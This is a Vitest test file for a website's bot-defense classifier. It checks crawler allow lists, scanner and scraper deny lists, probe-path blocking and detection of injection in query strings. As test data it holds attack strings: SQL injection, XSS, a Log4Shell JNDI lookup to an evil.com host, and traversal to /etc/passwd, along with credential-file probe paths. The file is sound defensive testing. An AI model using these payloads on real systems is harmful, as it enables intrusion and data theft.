import { describe, it, expect } from "vitest"
import {
  classifyRequest,
  matchAllowedAiCrawler,
  matchVulnScannerUa,
  matchBadScraperUa,
  matchAttackerProbePath,
  matchInjectionPattern,
  isSuspiciousMissingUa,
  isLikelyBotUa,
  AI_CRAWLER_ALLOWLIST,
  BAD_SCRAPER_DENYLIST,
  VULN_SCANNER_DENYLIST,
  ATTACKER_PROBE_PATHS,
  INJECTION_PATTERNS,
} from "@/lib/security/bot-defense"

/**
 * Build a Request that simulates an incoming edge request.
 * Defaults to GET with no UA so tests can layer in what they need.
 */
function makeRequest(opts: {
  url?: string
  method?: string
  ua?: string | null
}): Request {
  const url = opts.url ?? "https://regencompliance.ai/"
  const headers = new Headers()
  if (opts.ua !== null && opts.ua !== undefined) {
    headers.set("user-agent", opts.ua)
  }
  return new Request(url, {
    method: opts.method ?? "GET",
    headers,
  })
}

// ---------------------------------------------------------------------------
// AI_CRAWLER_ALLOWLIST - every entry resolves to allow
// ---------------------------------------------------------------------------

describe("AI_CRAWLER_ALLOWLIST exhaustive coverage", () => {
  for (const entry of AI_CRAWLER_ALLOWLIST) {
    it(`allows ${entry.name}`, () => {
      const result = classifyRequest(
        makeRequest({ ua: `${entry.name}/1.0 (https://example.com/bot)` }),
      )
      expect(result.verdict).toBe("allow")
      if (result.verdict === "allow") {
        expect(result.reason).toBe("ai-crawler")
        expect(result.matchedSignature).toBe(entry.name)
      }
    })
  }

  it("includes at least 18 AI/search/social bot entries", () => {
    // Sanity check that the locked list wasn't accidentally pruned
    expect(AI_CRAWLER_ALLOWLIST.length).toBeGreaterThanOrEqual(18)
  })

  it("matches case-insensitively (gptbot -> GPTBot)", () => {
    expect(matchAllowedAiCrawler("gptbot/1.0")).toBe("GPTBot")
    expect(matchAllowedAiCrawler("GPTBOT/1.0")).toBe("GPTBot")
    expect(matchAllowedAiCrawler("GptBot/1.0")).toBe("GPTBot")
  })

  it("matches real-world Googlebot UA", () => {
    const ua = "Googlebot/2.1 (+http://www.google.com/bot.html)"
    const result = classifyRequest(makeRequest({ ua }))
    expect(result.verdict).toBe("allow")
    if (result.verdict === "allow") {
      expect(result.matchedSignature).toBe("Googlebot")
    }
  })

  it("matches real-world Bingbot UA", () => {
    const ua =
      "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    const result = classifyRequest(makeRequest({ ua }))
    expect(result.verdict).toBe("allow")
  })

  it("matches real-world facebookexternalhit", () => {
    const ua = "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
    const result = classifyRequest(makeRequest({ ua }))
    expect(result.verdict).toBe("allow")
  })
})

// ---------------------------------------------------------------------------
// VULN_SCANNER_DENYLIST - every entry resolves to deny
// ---------------------------------------------------------------------------

describe("VULN_SCANNER_DENYLIST exhaustive coverage", () => {
  for (const entry of VULN_SCANNER_DENYLIST) {
    it(`denies vuln scanner ${entry.name}`, () => {
      // Use UA that contains the name as a substring with surrounding chars
      // matching the locked pattern (some patterns use \b boundaries).
      const ua = `${entry.name} scanner/1.0`
      const result = classifyRequest(makeRequest({ ua }))
      expect(result.verdict).toBe("deny")
      if (result.verdict === "deny") {
        expect(result.reason).toBe("vuln-scanner-ua")
        expect(result.matchedSignature).toBe(entry.name)
      }
    })
  }

  it("includes at least 21 vuln scanner entries", () => {
    expect(VULN_SCANNER_DENYLIST.length).toBeGreaterThanOrEqual(21)
  })

  it("matches sqlmap case-insensitively", () => {
    expect(matchVulnScannerUa("SQLMAP/1.6")).toBe("sqlmap")
    expect(matchVulnScannerUa("sqlmap/1.6")).toBe("sqlmap")
  })

  it("denies real-world nikto UA", () => {
    const ua = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)"
    const result = classifyRequest(makeRequest({ ua }))
    expect(result.verdict).toBe("deny")
    if (result.verdict === "deny") {
      expect(result.reason).toBe("vuln-scanner-ua")
    }
  })
})

// ---------------------------------------------------------------------------
// BAD_SCRAPER_DENYLIST - every entry resolves to deny
// ---------------------------------------------------------------------------

describe("BAD_SCRAPER_DENYLIST exhaustive coverage", () => {
  for (const entry of BAD_SCRAPER_DENYLIST) {
    it(`denies bad scraper ${entry.name}`, () => {
      const ua = `${entry.name}/2.0 (+https://example.com/about)`
      const result = classifyRequest(makeRequest({ ua }))
      expect(result.verdict).toBe("deny")
      if (result.verdict === "deny") {
        expect(result.reason).toBe("bad-scraper-ua")
        expect(result.matchedSignature).toBe(entry.name)
      }
    })
  }

  it("includes at least 18 bad scraper entries (incl. CCBot)", () => {
    expect(BAD_SCRAPER_DENYLIST.length).toBeGreaterThanOrEqual(18)
  })

  it("matches Bytespider case-insensitively", () => {
    expect(matchBadScraperUa("Bytespider/1.0")).toBe("Bytespider")
    expect(matchBadScraperUa("bytespider/1.0")).toBe("Bytespider")
    expect(matchBadScraperUa("BYTESPIDER")).toBe("Bytespider")
  })

  it("denies CCBot (Common Crawl - intentional, blocks upstream training)", () => {
    const ua = "CCBot/2.0 (https://commoncrawl.org/faq/)"
    const result = classifyRequest(makeRequest({ ua }))
    expect(result.verdict).toBe("deny")
    if (result.verdict === "deny") {
      expect(result.reason).toBe("bad-scraper-ua")
      expect(result.matchedSignature).toBe("CCBot")
    }
  })

  it("denies real-world AhrefsBot UA", () => {
    const ua = "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
    const result = classifyRequest(makeRequest({ ua }))
    expect(result.verdict).toBe("deny")
  })
})

// ---------------------------------------------------------------------------
// Precedence: AI crawler allow > everything
// ---------------------------------------------------------------------------

describe("AI crawler precedence over suspicious paths", () => {
  it("GPTBot hitting /wp-admin still gets ALLOW (precedence wins)", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/wp-admin/admin.php",
        ua: "GPTBot/1.0",
      }),
    )
    expect(result.verdict).toBe("allow")
    if (result.verdict === "allow") {
      expect(result.matchedSignature).toBe("GPTBot")
    }
  })

  it("Googlebot hitting /.env still gets ALLOW", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/.env",
        ua: "Googlebot/2.1 (+http://www.google.com/bot.html)",
      }),
    )
    expect(result.verdict).toBe("allow")
  })

  it("Slackbot link unfurl on /blog/anything gets ALLOW", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/blog/glp-1-compounded-marketing-compliance-2026",
        ua: "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
      }),
    )
    expect(result.verdict).toBe("allow")
  })
})

// ---------------------------------------------------------------------------
// ATTACKER_PROBE_PATHS - probe paths deny, app's /admin/ does NOT match
// ---------------------------------------------------------------------------

describe("ATTACKER_PROBE_PATHS path matching", () => {
  const probeCases = [
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.git/config",
    "/.git/HEAD",
    "/.svn/entries",
    "/wp-admin/admin.php",
    "/wp-login.php",
    "/wp-content/themes/twentytwentyone/style.css",
    "/wp-includes/wlwmanifest.xml",
    "/xmlrpc.php",
    "/phpmyadmin/",
    "/phpMyAdmin/",
    "/myadmin/",
    "/admin.php",
    "/administrator/index.php",
    "/.aws/credentials",
    "/.htaccess",
    "/.htpasswd",
    "/sftp-config.json",
    "/credentials.json",
    "/backup.sql",
    "/backup.zip",
    "/backup.tar.gz",
    "/web.config",
    "/server-status",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/jenkins/",
    "/actuator/env",
    "/actuator/health",
  ]

  // Contract requires at least 10 specific paths to resolve - we test ALL.
  for (const path of probeCases) {
    it(`denies probe path ${path}`, () => {
      const result = classifyRequest(
        makeRequest({
          url: `https://regencompliance.ai${path}`,
          ua: "Mozilla/5.0 (compatible; AttackBot)",
        }),
      )
      // Could be denied as probe OR could fire isLikelyBotUa first if the
      // UA looks bot-ish. Our UA "AttackBot" matches `bot`, but probe-path
      // check runs BEFORE bot-ua heuristic, so we expect deny + probe-path.
      expect(result.verdict).toBe("deny")
      if (result.verdict === "deny") {
        expect(result.reason).toBe("attacker-probe-path")
      }
    })
  }

  it("covers at least 10 distinct probe paths", () => {
    expect(probeCases.length).toBeGreaterThanOrEqual(10)
  })

  it("does NOT deny the app's own /admin/ path", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/admin",
        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
      }),
    )
    expect(result.verdict).toBe("normal")
  })

  it("does NOT deny /admin/users", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/admin/users",
        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
      }),
    )
    expect(result.verdict).toBe("normal")
  })

  it("does NOT deny /api/admin/users/123 (app's API surface)", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/api/admin/users/123",
        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
      }),
    )
    expect(result.verdict).toBe("normal")
  })

  it("does NOT deny /api/admin/stats (real route)", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/api/admin/stats",
        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
      }),
    )
    expect(result.verdict).toBe("normal")
  })

  it("does NOT deny /superadmin (Dibb Media surface)", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/superadmin/dashboard",
        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
      }),
    )
    expect(result.verdict).toBe("normal")
  })

  it("matches probe paths case-insensitively (/.ENV)", () => {
    expect(matchAttackerProbePath("/.ENV")).not.toBeNull()
  })

  it("matches /WP-ADMIN/ case-insensitively", () => {
    expect(matchAttackerProbePath("/WP-ADMIN/")).not.toBeNull()
  })

  it("includes at least 25 probe path patterns (locked list)", () => {
    expect(ATTACKER_PROBE_PATHS.length).toBeGreaterThanOrEqual(25)
  })
})

// ---------------------------------------------------------------------------
// INJECTION_PATTERNS - each pattern denies; benign URLs pass
// ---------------------------------------------------------------------------

describe("INJECTION_PATTERNS coverage", () => {
  const injectionCases: Array<{ name: string; url: string }> = [
    {
      name: "SQLi-OR-1-1",
      url: "https://regencompliance.ai/search?q=' OR '1'='1",
    },
    {
      name: "SQLi-UNION",
      url: "https://regencompliance.ai/search?q=1 UNION SELECT password FROM users",
    },
    {
      name: "SQLi-UNION (UNION ALL SELECT)",
      url: "https://regencompliance.ai/search?q=1 UNION ALL SELECT 1,2,3",
    },
    {
      name: "XSS-script-tag",
      url: "https://regencompliance.ai/search?q=<script>alert(1)</script>",
    },
    {
      name: "XSS-javascript-uri",
      url: "https://regencompliance.ai/search?next=javascript:alert(1)",
    },
    {
      name: "Log4Shell",
      url: "https://regencompliance.ai/?x=${jndi:ldap://evil.com/a}",
    },
    {
      name: "path-traversal-encoded",
      url: "https://regencompliance.ai/files/..%2F..%2Fetc%2Fpasswd",
    },
    {
      name: "path-traversal-raw",
      url: "https://regencompliance.ai/files/../../etc/passwd",
    },
    {
      name: "etc-passwd",
      url: "https://regencompliance.ai/load?file=etc/passwd",
    },
    {
      name: "cmd-exe",
      url: "https://regencompliance.ai/run?bin=cmd.exe",
    },
    {
      name: "null-byte",
      url: "https://regencompliance.ai/file?name=foo%00.jpg",
    },
    {
      name: "php-stream-wrappers",
      url: "https://regencompliance.ai/load?file=php://input",
    },
  ]

  for (const tc of injectionCases) {
    it(`denies ${tc.name}`, () => {
      const result = classifyRequest(
        makeRequest({
          url: tc.url,
          ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        }),
      )
      expect(result.verdict).toBe("deny")
      if (result.verdict === "deny") {
        // Either injection-pattern OR attacker-probe-path is acceptable
        // (e.g. raw `../` could hit probe matching for /.env via traversal).
        // The contract priority lists probe BEFORE injection, but neither
        // is incorrect - assertion just confirms it's one of those two.
        expect([
          "injection-pattern",
          "attacker-probe-path",
        ]).toContain(result.reason)
      }
    })
  }

  it("includes at least 11 injection patterns", () => {
    expect(INJECTION_PATTERNS.length).toBeGreaterThanOrEqual(11)
  })

  it("does NOT match benign URL /blog/posts?utm_source=email", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/blog/posts?utm_source=email&utm_campaign=launch",
        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      }),
    )
    expect(result.verdict).toBe("normal")
  })

  it("does NOT match benign URL with UNION in literal context", () => {
    // "Union" word inside other text shouldn't trigger - the pattern needs
    // "UNION SELECT" or "UNION ALL SELECT" with a word boundary.
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/blog/european-union-fda-comparison",
        ua: "Mozilla/5.0 Chrome/120",
      }),
    )
    expect(result.verdict).toBe("normal")
  })

  it("does NOT match benign URL /tools/scanner?url=https://example.com", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/tools/scanner?url=https://example.com",
        ua: "Mozilla/5.0 Chrome/120",
      }),
    )
    expect(result.verdict).toBe("normal")
  })

  it("uses matchInjectionPattern helper correctly on URL with no query", () => {
    expect(
      matchInjectionPattern(new URL("https://regencompliance.ai/about")),
    ).toBeNull()
  })

  it("uses matchInjectionPattern helper correctly with query injection", () => {
    expect(
      matchInjectionPattern(new URL("https://regencompliance.ai/?x=${jndi:ldap://evil}")),
    ).toBe("Log4Shell")
  })
})

// ---------------------------------------------------------------------------
// isSuspiciousMissingUa
// ---------------------------------------------------------------------------

describe("isSuspiciousMissingUa", () => {
  it("returns true for POST with null UA", () => {
    expect(isSuspiciousMissingUa("POST", null)).toBe(true)
  })

  it("returns true for POST with empty UA", () => {
    expect(isSuspiciousMissingUa("POST", "")).toBe(true)
  })

  it("returns true for POST with dash UA", () => {
    expect(isSuspiciousMissingUa("POST", "-")).toBe(true)
  })

  it("returns false for GET with null UA", () => {
    expect(isSuspiciousMissingUa("GET", null)).toBe(false)
  })

  it("returns false for HEAD with null UA", () => {
    expect(isSuspiciousMissingUa("HEAD", null)).toBe(false)
  })

  it("returns true for PUT with null UA", () => {
    expect(isSuspiciousMissingUa("PUT", null)).toBe(true)
  })

  it("returns true for PATCH with null UA", () => {
    expect(isSuspiciousMissingUa("PATCH", null)).toBe(true)
  })

  it("returns true for DELETE with null UA", () => {
    expect(isSuspiciousMissingUa("DELETE", null)).toBe(true)
  })

  it("returns true for POST with curl UA", () => {
    expect(isSuspiciousMissingUa("POST", "curl/8.0.1")).toBe(true)
  })

  it("returns true for POST with wget UA", () => {
    expect(isSuspiciousMissingUa("POST", "Wget/1.21.4")).toBe(true)
  })

  it("returns true for POST with python-requests UA", () => {
    expect(isSuspiciousMissingUa("POST", "python-requests/2.31.0")).toBe(true)
  })

  it("returns true for POST with Python-urllib UA", () => {
    expect(isSuspiciousMissingUa("POST", "Python-urllib/3.11")).toBe(true)
  })

  it("returns true for POST with Java/ UA", () => {
    expect(isSuspiciousMissingUa("POST", "Java/17.0.2")).toBe(true)
  })

  it("returns true for POST with Go-http-client UA", () => {
    expect(isSuspiciousMissingUa("POST", "Go-http-client/2.0")).toBe(true)
  })

  it("returns true for POST with libwww-perl UA", () => {
    expect(isSuspiciousMissingUa("POST", "libwww-perl/6.68")).toBe(true)
  })

  it("returns false for POST with a real browser UA", () => {
    expect(
      isSuspiciousMissingUa(
        "POST",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      ),
    ).toBe(false)
  })

  it("handles lowercase method", () => {
    expect(isSuspiciousMissingUa("post", null)).toBe(true)
    expect(isSuspiciousMissingUa("get", null)).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// isLikelyBotUa heuristic
// ---------------------------------------------------------------------------

describe("isLikelyBotUa", () => {
  it("returns true for unknown crawler UA", () => {
    expect(isLikelyBotUa("MyCustomCrawler/1.0")).toBe(true)
  })

  it("returns true for unknown spider UA", () => {
    expect(isLikelyBotUa("HappySpider/2.0")).toBe(true)
  })

  it("returns true for unknown bot UA", () => {
    expect(isLikelyBotUa("RandomBot/3.0 (https://example.com)")).toBe(true)
  })

  it("returns true for archive crawler", () => {
    expect(isLikelyBotUa("archive.org_bot")).toBe(true)
  })

  it("returns false for known AI crawler (already allowed)", () => {
    expect(isLikelyBotUa("GPTBot/1.0")).toBe(false)
    expect(isLikelyBotUa("Googlebot/2.1")).toBe(false)
  })

  it("returns false for empty UA", () => {
    expect(isLikelyBotUa("")).toBe(false)
  })

  it("returns false for browser UA", () => {
    expect(
      isLikelyBotUa(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      ),
    ).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// classifyRequest end-to-end behaviour
// ---------------------------------------------------------------------------

describe("classifyRequest end-to-end", () => {
  it("POST with no UA -> deny missing-ua-on-post", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/api/free-audit",
        method: "POST",
        ua: null,
      }),
    )
    expect(result.verdict).toBe("deny")
    if (result.verdict === "deny") {
      expect(result.reason).toBe("missing-ua-on-post")
      expect(result.matchedSignature).toBe("(empty)")
    }
  })

  it("GET with no UA -> normal (marketing site is permissive)", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/",
        method: "GET",
        ua: null,
      }),
    )
    expect(result.verdict).toBe("normal")
  })

  it("POST with curl/8.0 UA -> deny", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/api/free-audit",
        method: "POST",
        ua: "curl/8.0",
      }),
    )
    expect(result.verdict).toBe("deny")
    if (result.verdict === "deny") {
      expect(result.reason).toBe("missing-ua-on-post")
      expect(result.matchedSignature).toBe("curl/8.0")
    }
  })

  it("GET with curl/8.0 -> normal (curl GET is fine, often legit fetch)", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/api/health",
        method: "GET",
        ua: "curl/8.0",
      }),
    )
    expect(result.verdict).toBe("normal")
  })

  it("Realistic Chrome browser UA -> normal", () => {
    const ua =
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    const result = classifyRequest(
      makeRequest({ url: "https://regencompliance.ai/", ua }),
    )
    expect(result.verdict).toBe("normal")
    if (result.verdict === "normal") {
      expect(result.matchedSignature).toBe("")
    }
  })

  it("Realistic Firefox UA -> normal", () => {
    const ua =
      "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
    const result = classifyRequest(
      makeRequest({ url: "https://regencompliance.ai/", ua }),
    )
    expect(result.verdict).toBe("normal")
  })

  it("Unknown bot UA -> rate-limit-strict", () => {
    const ua = "MyCustomCrawler/1.0 (+https://example.com/bot)"
    const result = classifyRequest(
      makeRequest({ url: "https://regencompliance.ai/", ua }),
    )
    expect(result.verdict).toBe("rate-limit-strict")
    if (result.verdict === "rate-limit-strict") {
      expect(result.reason).toBe("unknown-bot-ua")
      expect(result.matchedSignature.length).toBeLessThanOrEqual(100)
    }
  })

  it("Truncates long unknown bot UA signature to 100 chars", () => {
    const longUa =
      "ReallyLongCrawlerName/1.0 " + "x".repeat(500) + " trailing-bot"
    const result = classifyRequest(
      makeRequest({ url: "https://regencompliance.ai/", ua: longUa }),
    )
    expect(result.verdict).toBe("rate-limit-strict")
    if (result.verdict === "rate-limit-strict") {
      expect(result.matchedSignature.length).toBe(100)
    }
  })

  it("Empty UA on GET to plain page -> normal", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/about",
        ua: "",
      }),
    )
    expect(result.verdict).toBe("normal")
  })

  it("Empty UA on POST -> deny missing-ua-on-post", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/api/contact",
        method: "POST",
        ua: "",
      }),
    )
    expect(result.verdict).toBe("deny")
    if (result.verdict === "deny") {
      expect(result.reason).toBe("missing-ua-on-post")
    }
  })

  it("Dash UA on POST -> deny", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/api/contact",
        method: "POST",
        ua: "-",
      }),
    )
    expect(result.verdict).toBe("deny")
  })

  it("Vuln scanner UA on innocuous path -> deny vuln-scanner-ua (UA wins)", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/",
        ua: "sqlmap/1.7.2#stable (https://sqlmap.org)",
      }),
    )
    expect(result.verdict).toBe("deny")
    if (result.verdict === "deny") {
      expect(result.reason).toBe("vuln-scanner-ua")
    }
  })

  it("Bad scraper UA on innocuous path -> deny bad-scraper-ua", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/",
        ua: "Bytespider/1.0",
      }),
    )
    expect(result.verdict).toBe("deny")
    if (result.verdict === "deny") {
      expect(result.reason).toBe("bad-scraper-ua")
    }
  })

  it("Vuln scanner UA hitting probe path -> UA reason wins (precedence)", () => {
    // vuln-scanner-ua check runs BEFORE attacker-probe-path
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/wp-admin",
        ua: "Nikto/2.5.0",
      }),
    )
    expect(result.verdict).toBe("deny")
    if (result.verdict === "deny") {
      expect(result.reason).toBe("vuln-scanner-ua")
    }
  })

  it("Bad scraper UA on probe path -> bad-scraper-ua wins", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/.env",
        ua: "AhrefsBot/7.0",
      }),
    )
    expect(result.verdict).toBe("deny")
    if (result.verdict === "deny") {
      expect(result.reason).toBe("bad-scraper-ua")
    }
  })

  it("Browser UA on probe path -> attacker-probe-path", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/wp-login.php",
        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
      }),
    )
    expect(result.verdict).toBe("deny")
    if (result.verdict === "deny") {
      expect(result.reason).toBe("attacker-probe-path")
    }
  })

  it("Browser UA with injection in query -> injection-pattern", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/search?q=<script>alert(1)</script>",
        ua: "Mozilla/5.0 Chrome/120",
      }),
    )
    expect(result.verdict).toBe("deny")
    if (result.verdict === "deny") {
      expect(result.reason).toBe("injection-pattern")
    }
  })

  it("PerplexityBot on /blog -> allow", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/blog/ketamine-clinic-marketing-compliance-guide",
        ua: "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; PerplexityBot/1.0; +https://perplexity.ai/perplexitybot)",
      }),
    )
    expect(result.verdict).toBe("allow")
    if (result.verdict === "allow") {
      expect(result.matchedSignature).toBe("PerplexityBot")
    }
  })

  it("ClaudeBot allow", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/blog",
        ua: "Mozilla/5.0 (compatible; ClaudeBot/1.0; +claudebot@anthropic.com)",
      }),
    )
    expect(result.verdict).toBe("allow")
    if (result.verdict === "allow") {
      expect(result.matchedSignature).toBe("ClaudeBot")
    }
  })

  it("verdict for normal request has empty matchedSignature exactly", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/",
        ua: "Mozilla/5.0 Chrome/120",
      }),
    )
    expect(result.verdict).toBe("normal")
    if (result.verdict === "normal") {
      expect(result.matchedSignature).toBe("")
      expect(result.reason).toBe("no-match")
    }
  })
})

// ---------------------------------------------------------------------------
// Edge cases on URL handling
// ---------------------------------------------------------------------------

describe("URL edge cases", () => {
  it("handles URL with hash fragment (hash is ignored)", () => {
    // Hash fragments never reach the server so even a javascript: in hash
    // shouldn't be tested. Our impl only checks pathname + search.
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/page#javascript:alert(1)",
        ua: "Mozilla/5.0 Chrome/120",
      }),
    )
    expect(result.verdict).toBe("normal")
  })

  it("handles URL with no query string", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/about",
        ua: "Mozilla/5.0 Chrome/120",
      }),
    )
    expect(result.verdict).toBe("normal")
  })

  it("handles URL with deeply nested path", () => {
    const result = classifyRequest(
      makeRequest({
        url: "https://regencompliance.ai/blog/states/florida/specialty/glp-1",
        ua: "Mozilla/5.0 Chrome/120",
      }),
    )
    expect(result.verdict).toBe("normal")
  })

  it("matchAttackerProbePath returns null for plain pathname", () => {
    expect(matchAttackerProbePath("/about")).toBeNull()
    expect(matchAttackerProbePath("/admin/users")).toBeNull()
    expect(matchAttackerProbePath("/api/admin/stats")).toBeNull()
  })

  it("matchAttackerProbePath returns regex source for matched probe", () => {
    const m = matchAttackerProbePath("/wp-login.php")
    expect(m).not.toBeNull()
    expect(typeof m).toBe("string")
  })
})
